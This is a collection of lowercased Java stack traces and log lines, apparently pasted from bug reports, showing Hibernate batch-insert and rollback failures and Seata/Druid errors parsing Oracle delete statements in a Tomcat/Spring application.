org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:118) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:102) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:109) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.containerbase.invoke(containerbase.java:929) at org.apache.coyote.tomcat5.coyoteadapter.service(coyoteadapter.java:160) at org.apache.coyote.http11.http11processor.process(http11processor.java:799) at org.apache.coyote.http11.http11protocol$http11connectionhandler.processconnection(http11protocol.java:705) at org.apache.tomcat.util.net.tcpworkerthread.runit(pooltcpendpoint.java:577) at org.apache.tomcat.util.threads.threadpool$controlrunnable.run(threadpool.java:683) at java.lang.thread.run(thread.java:745)
2019-09-25 09:24:32,905 error [org.springframework.orm.hibernate3.hibernatetransactionmanager] - commit exception overridden by rollback exception
org.springframework.jdbc.uncategorizedsqlexception: hibernate flushing: could not execute jdbc batch update; uncategorized sqlexception for sql [insert into ebd_operation_log (eop_id, eop_operate_person, eop_operate_result, eop_operate_info, eop_log_id) values (?, ?, ?, ?, ?)]; sql state [null]; error code [0]; error; nested exception is java.sql.sqlexception: error at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:83) at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:80) at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:80) at org.springframework.orm.hibernate3.hibernatetransactionmanager.convertjdbcaccessexception(hibernatetransactionmanager.java:801) at org.springframework.orm.hibernate3.hibernatetransactionmanager.converthibernateaccessexception(hibernatetransactionmanager.java:787) at org.springframework.orm.hibernate3.hibernatetransactionmanager.docommit(hibernatetransactionmanager.java:663) at org.springframework.transaction.support.abstractplatformtransactionmanager.processcommit(abstractplatformtransactionmanager.java:732) at org.springframework.transaction.support.abstractplatformtransactionmanager.commit(abstractplatformtransactionmanager.java:701) at org.springframework.transaction.interceptor.transactionaspectsupport.committransactionafterreturning(transactionaspectsupport.java:321) at com.nstc.framework.spring.transactioninterceptor.committransactionafterreturning(transactioninterceptor.java:39) at org.springframework.transaction.interceptor.transactioninterceptor.invoke(transactioninterceptor.java:116) at com.nstc.framework.spring.transactioninterceptor.invoke(transactioninterceptor.java:35) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:171) at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:204) at com.sun.proxy.$proxy11.acceptoperation(unknown source) at com.nstc.dtp.action.acceptoperationaction.execute(acceptoperationaction.java:31) at com.nstc.dtp.defaulteventserver$1.doinopensession(defaulteventserver.java:154) at com.nstc.framework.orm.hibernate3.opensessiontemplate.execute(opensessiontemplate.java:152) at com.nstc.dtp.defaulteventserver.execevent(defaulteventserver.java:152) at com.nstc.dtp.defaulteventserver.execute(defaulteventserver.java:305) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:57) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:606) at org.springframework.aop.support.aoputils.invokejoinpointusingreflection(aoputils.java:307) at org.springframework.aop.framework.reflectivemethodinvocation.invokejoinpoint(reflectivemethodinvocation.java:182) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:149) at org.springframework.remoting.support.remoteinvocationtraceinterceptor.invoke(remoteinvocationtraceinterceptor.java:77) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:171) at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:204) at com.sun.proxy.$proxy12.execute(unknown source) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:57) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:606) at org.springframework.remoting.support.remoteinvocation.invoke(remoteinvocation.java:205) at org.springframework.remoting.support.defaultremoteinvocationexecutor.invoke(defaultremoteinvocationexecutor.java:38) at org.springframework.remoting.support.remoteinvocationbasedexporter.invoke(remoteinvocationbasedexporter.java:78) at org.springframework.remoting.support.remoteinvocationbasedexporter.invokeandcreateresult(remoteinvocationbasedexporter.java:114) at org.springframework.remoting.httpinvoker.httpinvokerserviceexporter.handlerequest(httpinvokerserviceexporter.java:74) at org.springframework.web.servlet.mvc.httprequesthandleradapter.handle(httprequesthandleradapter.java:49) at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:875) at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:807) at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:571) at org.springframework.web.servlet.frameworkservlet.dopost(frameworkservlet.java:511) at javax.servlet.http.httpservlet.service(httpservlet.java:709) at com.nstc.framework.servlet.nstcdispatcherservlet.service(nstcdispatcherservlet.java:71) at javax.servlet.http.httpservlet.service(httpservlet.java:802) at com.nstc.framework.servlet.nstcdispatcherservlet.service(nstcdispatcherservlet.java:59) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:237) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:157) at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:214) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardcontextvalve.invokeinternal(standardcontextvalve.java:198) at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:152) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:137) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:118) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:102) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:109) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.containerbase.invoke(containerbase.java:929) at org.apache.coyote.tomcat5.coyoteadapter.service(coyoteadapter.java:160) at org.apache.coyote.http11.http11processor.process(http11processor.java:799) at org.apache.coyote.http11.http11protocol$http11connectionhandler.processconnection(http11protocol.java:705) at org.apache.tomcat.util.net.tcpworkerthread.runit(pooltcpendpoint.java:577) at org.apache.tomcat.util.threads.threadpool$controlrunnable.run(threadpool.java:683) at java.lang.thread.run(thread.java:745)
caused by: java.sql.sqlexception: error at com.alibaba.druid.pool.druiddatasource.handleconnectionexception(druiddatasource.java:1569) at com.alibaba.druid.pool.druidpooledconnection.handleexception(druidpooledconnection.java:133) at com.alibaba.druid.pool.druidpooledstatement.checkexception(druidpooledstatement.java:77) at com.alibaba.druid.pool.druidpooledpreparedstatement.executebatch(druidpooledpreparedstatement.java:570) at com.nstc.dtp.rm.datasource.statementproxy$10.execute(statementproxy.java:150) at com.nstc.dtp.rm.datasource.statementproxy$10.execute(statementproxy.java:147) at com.nstc.dtp.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommitfalse(abstractdmlbaseexecutor.java:61) at com.nstc.dtp.rm.datasource.exec.abstractdmlbaseexecutor.doexecute(abstractdmlbaseexecutor.java:48) at com.nstc.dtp.rm.datasource.exec.basetransactionalexecutor.execute(basetransactionalexecutor.java:79) at com.nstc.dtp.rm.datasource.exec.executetemplate.execute(executetemplate.java:89) at com.nstc.dtp.rm.datasource.exec.executetemplate.execute(executetemplate.java:34) at com.nstc.dtp.rm.datasource.statementproxy.executebatch(statementproxy.java:147) at org.hibernate.jdbc.batchingbatcher.doexecutebatch(batchingbatcher.java:70) at org.hibernate.jdbc.abstractbatcher.executebatch(abstractbatcher.java:268) at org.hibernate.engine.actionqueue.executeactions(actionqueue.java:266) at org.hibernate.engine.actionqueue.executeactions(actionqueue.java:167) at org.hibernate.event.def.abstractflushingeventlistener.performexecutions(abstractflushingeventlistener.java:321) at org.hibernate.event.def.defaultflusheventlistener.onflush(defaultflusheventlistener.java:50) at org.hibernate.impl.sessionimpl.flush(sessionimpl.java:1027) at org.hibernate.impl.sessionimpl.managedflush(sessionimpl.java:365) at org.hibernate.transaction.jdbctransaction.commit(jdbctransaction.java:137) at org.springframework.orm.hibernate3.hibernatetransactionmanager.docommit(hibernatetransactionmanager.java:655) ..
caused by: java.lang.arrayindexoutofboundsexception at java.lang.system.arraycopy(native method) at oracle.jdbc.driver.t4crowidaccessor.unmarshalonerow(t4crowidaccessor.java:203) at oracle.jdbc.driver.t4c8oall.readrxd(t4c8oall.java:696) at oracle.jdbc.driver.t4cttifun.receive(t4cttifun.java:340) at oracle.jdbc.driver.t4cttifun.dorpc(t4cttifun.java:192) at oracle.jdbc.driver.t4c8oall.dooall(t4c8oall.java:531) at oracle.jdbc.driver.t4cpreparedstatement.dooall8(t4cpreparedstatement.java:207) at oracle.jdbc.driver.t4cpreparedstatement.executeforrows(t4cpreparedstatement.java:1044) at oracle.jdbc.driver.oraclepreparedstatement.executeforrowswithtimeout(oraclepreparedstatement.java:10143) at oracle.jdbc.driver.oraclepreparedstatement.executebatch(oraclepreparedstatement.java:10249) at oracle.jdbc.driver.oraclestatementwrapper.executebatch(oraclestatementwrapper.java:230) at com.alibaba.druid.filter.filterchainimpl.statement_executebatch(filterchainimpl.java:3066) at com.alibaba.druid.filter.filteradapter.statement_executebatch(filteradapter.java:2496) at com.alibaba.druid.filter.filtereventadapter.statement_executebatch(filtereventadapter.java:279) at com.alibaba.druid.filter.filterchainimpl.statement_executebatch(filterchainimpl.java:3064) at com.alibaba.druid.wall.wallfilter.statement_executebatch(wallfilter.java:503) at com.alibaba.druid.filter.filterchainimpl.statement_executebatch(filterchainimpl.java:3064) at com.alibaba.druid.filter.filteradapter.statement_executebatch(filteradapter.java:2496) at com.alibaba.druid.filter.filtereventadapter.statement_executebatch(filtereventadapter.java:279) at com.alibaba.druid.filter.filterchainimpl.statement_executebatch(filterchainimpl.java:3064) at com.alibaba.druid.proxy.jdbc.statementproxyimpl.executebatch(statementproxyimpl.java:202) at com.alibaba.druid.pool.druidpooledpreparedstatement.executebatch(druidpooledpreparedstatement.java:566) ..
org.springframework.transaction.transactionsystemexception: could not roll back hibernate transaction; nested exception is org.hibernate.transactionexception: jdbc rollback failed at org.springframework.orm.hibernate3.hibernatetransactionmanager.dorollback(hibernatetransactionmanager.java:677) at org.springframework.transaction.support.abstractplatformtransactionmanager.dorollbackoncommitexception(abstractplatformtransactionmanager.java:873) at org.springframework.transaction.support.abstractplatformtransactionmanager.processcommit(abstractplatformtransactionmanager.java:760) at org.springframework.transaction.support.abstractplatformtransactionmanager.commit(abstractplatformtransactionmanager.java:701) at org.springframework.transaction.interceptor.transactionaspectsupport.committransactionafterreturning(transactionaspectsupport.java:321) at com.nstc.framework.spring.transactioninterceptor.committransactionafterreturning(transactioninterceptor.java:39) at org.springframework.transaction.interceptor.transactioninterceptor.invoke(transactioninterceptor.java:116) at com.nstc.framework.spring.transactioninterceptor.invoke(transactioninterceptor.java:35) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:171) at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:204) at com.sun.proxy.$proxy11.acceptoperation(unknown source) at com.nstc.dtp.action.acceptoperationaction.execute(acceptoperationaction.java:31) at com.nstc.dtp.defaulteventserver$1.doinopensession(defaulteventserver.java:154) at com.nstc.framework.orm.hibernate3.opensessiontemplate.execute(opensessiontemplate.java:152) at com.nstc.dtp.defaulteventserver.execevent(defaulteventserver.java:152) at com.nstc.dtp.defaulteventserver.execute(defaulteventserver.java:305) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:57) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:606) at org.springframework.aop.support.aoputils.invokejoinpointusingreflection(aoputils.java:307) at org.springframework.aop.framework.reflectivemethodinvocation.invokejoinpoint(reflectivemethodinvocation.java:182) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:149) at org.springframework.remoting.support.remoteinvocationtraceinterceptor.invoke(remoteinvocationtraceinterceptor.java:77) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:171) at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:204) at com.sun.proxy.$proxy12.execute(unknown source) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:57) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:606) at org.springframework.remoting.support.remoteinvocation.invoke(remoteinvocation.java:205) at org.springframework.remoting.support.defaultremoteinvocationexecutor.invoke(defaultremoteinvocationexecutor.java:38) at org.springframework.remoting.support.remoteinvocationbasedexporter.invoke(remoteinvocationbasedexporter.java:78) at org.springframework.remoting.support.remoteinvocationbasedexporter.invokeandcreateresult(remoteinvocationbasedexporter.java:114) at org.springframework.remoting.httpinvoker.httpinvokerserviceexporter.handlerequest(httpinvokerserviceexporter.java:74) at org.springframework.web.servlet.mvc.httprequesthandleradapter.handle(httprequesthandleradapter.java:49) at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:875) at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:807) at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:571) at org.springframework.web.servlet.frameworkservlet.dopost(frameworkservlet.java:511) at javax.servlet.http.httpservlet.service(httpservlet.java:709) at com.nstc.framework.servlet.nstcdispatcherservlet.service(nstcdispatcherservlet.java:71) at javax.servlet.http.httpservlet.service(httpservlet.java:802) at com.nstc.framework.servlet.nstcdispatcherservlet.service(nstcdispatcherservlet.java:59) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:237) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:157) at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:214) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardcontextvalve.invokeinternal(standardcontextvalve.java:198) at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:152) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:137) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:118) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:102) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:109) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.containerbase.invoke(containerbase.java:929) at org.apache.coyote.tomcat5.coyoteadapter.service(coyoteadapter.java:160) at org.apache.coyote.http11.http11processor.process(http11processor.java:799) at org.apache.coyote.http11.http11protocol$http11connectionhandler.processconnection(http11protocol.java:705) at org.apache.tomcat.util.net.tcpworkerthread.runit(pooltcpendpoint.java:577) at org.apache.tomcat.util.threads.threadpool$controlrunnable.run(threadpool.java:683) at java.lang.thread.run(thread.java:745)
caused by: org.hibernate.transactionexception: jdbc rollback failed at org.hibernate.transaction.jdbctransaction.rollback(jdbctransaction.java:204) at org.springframework.orm.hibernate3.hibernatetransactionmanager.dorollback(hibernatetransactionmanager.java:674) ..
caused by: java.sql.sqlexception: : [0] at oracle.jdbc.driver.t4cttifun.receive(t4cttifun.java:464) at oracle.jdbc.driver.t4cttifun.dorpc(t4cttifun.java:192) at oracle.jdbc.driver.t4c7ocommoncall.doorollback(t4c7ocommoncall.java:68) at oracle.jdbc.driver.t4cconnection.dorollback(t4cconnection.java:694) at oracle.jdbc.driver.physicalconnection.rollback(physicalconnection.java:3943) at com.alibaba.druid.filter.filterchainimpl.connection_rollback(filterchainimpl.java:714) at com.alibaba.druid.filter.filteradapter.connection_rollback(filteradapter.java:973) at com.alibaba.druid.filter.logging.logfilter.connection_rollback(logfilter.java:404) at com.alibaba.druid.filter.filterchainimpl.connection_rollback(filterchainimpl.java:709) at com.alibaba.druid.filter.filteradapter.connection_rollback(filteradapter.java:973) at com.alibaba.druid.filter.filterchainimpl.connection_rollback(filterchainimpl.java:709) at com.alibaba.druid.filter.stat.statfilter.connection_rollback(statfilter.java:275) at com.alibaba.druid.filter.filterchainimpl.connection_rollback(filterchainimpl.java:709) at com.alibaba.druid.proxy.jdbc.connectionproxyimpl.rollback(connectionproxyimpl.java:400) at com.alibaba.druid.pool.druidpooledconnection.rollback(druidpooledconnection.java:781) at com.nstc.dtp.rm.datasource.connectionproxy.rollback(connectionproxy.java:238) at org.hibernate.transaction.jdbctransaction.rollbackandresetautocommit(jdbctransaction.java:217) at org.hibernate.transaction.jdbctransaction.rollback(jdbctransaction.java:196) ..
2019-09-25 09:24:32,911 error [com.nstc.dtp.defaulteventserver] - could not roll back hibernate transaction; nested exception is org.hibernate.transactionexception: jdbc rollback failed
org.springframework.transaction.transactionsystemexception: could not roll back hibernate transaction; nested exception is org.hibernate.transactionexception: jdbc rollback failed at org.springframework.orm.hibernate3.hibernatetransactionmanager.dorollback(hibernatetransactionmanager.java:677) at org.springframework.transaction.support.abstractplatformtransactionmanager.dorollbackoncommitexception(abstractplatformtransactionmanager.java:873) at org.springframework.transaction.support.abstractplatformtransactionmanager.processcommit(abstractplatformtransactionmanager.java:760) at org.springframework.transaction.support.abstractplatformtransactionmanager.commit(abstractplatformtransactionmanager.java:701) at org.springframework.transaction.interceptor.transactionaspectsupport.committransactionafterreturning(transactionaspectsupport.java:321) at com.nstc.framework.spring.transactioninterceptor.committransactionafterreturning(transactioninterceptor.java:39) at org.springframework.transaction.interceptor.transactioninterceptor.invoke(transactioninterceptor.java:116) at com.nstc.framework.spring.transactioninterceptor.invoke(transactioninterceptor.java:35) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:171) at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:204) at com.sun.proxy.$proxy11.acceptoperation(unknown source) at com.nstc.dtp.action.acceptoperationaction.execute(acceptoperationaction.java:31) at com.nstc.dtp.defaulteventserver$1.doinopensession(defaulteventserver.java:154) at com.nstc.framework.orm.hibernate3.opensessiontemplate.execute(opensessiontemplate.java:152) at com.nstc.dtp.defaulteventserver.execevent(defaulteventserver.java:152) at com.nstc.dtp.defaulteventserver.execute(defaulteventserver.java:305) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:57) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:606) at org.springframework.aop.support.aoputils.invokejoinpointusingreflection(aoputils.java:307) at org.springframework.aop.framework.reflectivemethodinvocation.invokejoinpoint(reflectivemethodinvocation.java:182) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:149) at org.springframework.remoting.support.remoteinvocationtraceinterceptor.invoke(remoteinvocationtraceinterceptor.java:77) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:171) at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:204) at com.sun.proxy.$proxy12.execute(unknown source) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:57) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:606) at org.springframework.remoting.support.remoteinvocation.invoke(remoteinvocation.java:205) at org.springframework.remoting.support.defaultremoteinvocationexecutor.invoke(defaultremoteinvocationexecutor.java:38) at org.springframework.remoting.support.remoteinvocationbasedexporter.invoke(remoteinvocationbasedexporter.java:78) at org.springframework.remoting.support.remoteinvocationbasedexporter.invokeandcreateresult(remoteinvocationbasedexporter.java:114) at org.springframework.remoting.httpinvoker.httpinvokerserviceexporter.handlerequest(httpinvokerserviceexporter.java:74) at org.springframework.web.servlet.mvc.httprequesthandleradapter.handle(httprequesthandleradapter.java:49) at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:875) at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:807) at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:571) at org.springframework.web.servlet.frameworkservlet.dopost(frameworkservlet.java:511) at javax.servlet.http.httpservlet.service(httpservlet.java:709) at com.nstc.framework.servlet.nstcdispatcherservlet.service(nstcdispatcherservlet.java:71) at javax.servlet.http.httpservlet.service(httpservlet.java:802) at com.nstc.framework.servlet.nstcdispatcherservlet.service(nstcdispatcherservlet.java:59) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:237) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:157) at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:214) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardcontextvalve.invokeinternal(standardcontextvalve.java:198) at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:152) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:137) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:118) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:102) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:109) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.containerbase.invoke(containerbase.java:929) at org.apache.coyote.tomcat5.coyoteadapter.service(coyoteadapter.java:160) at org.apache.coyote.http11.http11processor.process(http11processor.java:799) at org.apache.coyote.http11.http11protocol$http11connectionhandler.processconnection(http11protocol.java:705) at org.apache.tomcat.util.net.tcpworkerthread.runit(pooltcpendpoint.java:577) at org.apache.tomcat.util.threads.threadpool$controlrunnable.run(threadpool.java:683) at java.lang.thread.run(thread.java:745)
caused by: org.hibernate.transactionexception: jdbc rollback failed at org.hibernate.transaction.jdbctransaction.rollback(jdbctransaction.java:204) at org.springframework.orm.hibernate3.hibernatetransactionmanager.dorollback(hibernatetransactionmanager.java:674) ..
caused by: java.sql.sqlexception: : [0] at oracle.jdbc.driver.t4cttifun.receive(t4cttifun.java:464) at oracle.jdbc.driver.t4cttifun.dorpc(t4cttifun.java:192) at oracle.jdbc.driver.t4c7ocommoncall.doorollback(t4c7ocommoncall.java:68) at oracle.jdbc.driver.t4cconnection.dorollback(t4cconnection.java:694) at oracle.jdbc.driver.physicalconnection.rollback(physicalconnection.java:3943) at com.alibaba.druid.filter.filterchainimpl.connection_rollback(filterchainimpl.java:714) at com.alibaba.druid.filter.filteradapter.connection_rollback(filteradapter.java:973) at com.alibaba.druid.filter.logging.logfilter.connection_rollback(logfilter.java:404) at com.alibaba.druid.filter.filterchainimpl.connection_rollback(filterchainimpl.java:709) at com.alibaba.druid.filter.filteradapter.connection_rollback(filteradapter.java:973) at com.alibaba.druid.filter.filterchainimpl.connection_rollback(filterchainimpl.java:709) at com.alibaba.druid.filter.stat.statfilter.connection_rollback(statfilter.java:275) at com.alibaba.druid.filter.filterchainimpl.connection_rollback(filterchainimpl.java:709) at com.alibaba.druid.proxy.jdbc.connectionproxyimpl.rollback(connectionproxyimpl.java:400) at com.alibaba.druid.pool.druidpooledconnection.rollback(druidpooledconnection.java:781) at com.nstc.dtp.rm.datasource.connectionproxy.rollback(connectionproxy.java:238) at org.hibernate.transaction.jdbctransaction.rollbackandresetautocommit(jdbctransaction.java:217) at org.hibernate.transaction.jdbctransaction.rollback(jdbctransaction.java:196) ..
2019-09-25 09:24:32,933 info [com.nstc.dtp.tm.api.defaultglobaltransaction] - [192.168.60.133:8091:2023101918] commit status:committed
caused by: java.lang.classcastexception: com.alibaba.druid.sql.ast.expr.sqlinlistexpr cannot be cast to com.alibaba.druid.sql.ast.expr.sqlbinaryopexpr at io.seata.rm.datasource.sql.druid.oracle.oracledeleterecognizer.getwherecondition(oracledeleterecognizer.java:86) at io.seata.rm.datasource.exec.basetransactionalexecutor.buildwherecondition(basetransactionalexecutor.java:134) at io.seata.rm.datasource.exec.deleteexecutor.buildbeforeimagesql(deleteexecutor.java:67) at io.seata.rm.datasource.exec.deleteexecutor.beforeimage(deleteexecutor.java:61) at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommitfalse(abstractdmlbaseexecutor.java:72) at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.lambda$executeautocommittrue$0(abstractdmlbaseexecutor.java:91)2019-09-23 19:02:11.202 info [main]io.seata.tm.api.defaultglobaltransaction.rollback:148 -[192.168.117.1:8091:2022959941] rollback status:rollbacked ``` ```
caused by: java.lang.illegalargumentexception: unexpected where expr: sqlbetweenexpr at io.seata.rm.datasource.sql.druid.oracle.oracledeleterecognizer.getwherecondition(oracledeleterecognizer.java:93) at io.seata.rm.datasource.exec.basetransactionalexecutor.buildwherecondition(basetransactionalexecutor.java:134) at io.seata.rm.datasource.exec.deleteexecutor.buildbeforeimagesql(deleteexecutor.java:67) at io.seata.rm.datasource.exec.deleteexecutor.beforeimage(deleteexecutor.java:61) at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommitfalse(abstractdmlbaseexecutor.java:72) at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.lambda$executeautocommittrue$0(abstractdmlbaseexecutor.java:91) at io.seata.rm.datasource.connectionproxy$lockretrypolicy.doretryonlockconflict(connectionproxy.java:290) at io.seata.rm.datasource.exec.abstractdmlbaseexecutor$lockretrypolicy.execute(abstractdmlbaseexecutor.java:135) at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommittrue(abstractdmlbaseexecutor.java:90) at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.doexecute(abstractdmlbaseexecutor.java:58) at io.seata.rm.datasource.exec.basetransactionalexecutor.execute(basetransactionalexecutor.java:96) at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:101) ..
so,when we try to call it's method(or any other members),will cause the following exceptions:
caused by: java.lang.illegalaccessexception: class io.seata.spring.annotation.globaltransactionscanner can not access a member of class com.alibaba.druid.spring.boot.autoconfigure.druiddatasourcewrapper with modifiers "public" at sun.reflect.reflection.ensurememberaccess(reflection.java:102) at java.lang.reflect.accessibleobject.slowcheckmemberaccess(accessibleobject.java:296) at java.lang.reflect.accessibleobject.checkaccess(accessibleobject.java:288) at java.lang.reflect.method.invoke(method.java:491) at io.seata.spring.annotation.globaltransactionscanner.lambda$postprocessbeforeinitialization$0(globaltransactionscanner.java:321) at com.alibaba.druid.spring.boot.autoconfigure.druiddatasourcewrapper$$enhancerbycglib$$7bd61a2e.afterpropertiesset(<generated>) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.invokeinitmethods(abstractautowirecapablebeanfactory.java:1837) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.initializebean(abstractautowirecapablebeanfactory.java:1774) ..
121 common frames omitted
10:55:07,385 error io.seata.rm.datasource.sql.struct.tablemetacache:77 - get cache error:failed to fetch schema of `order`
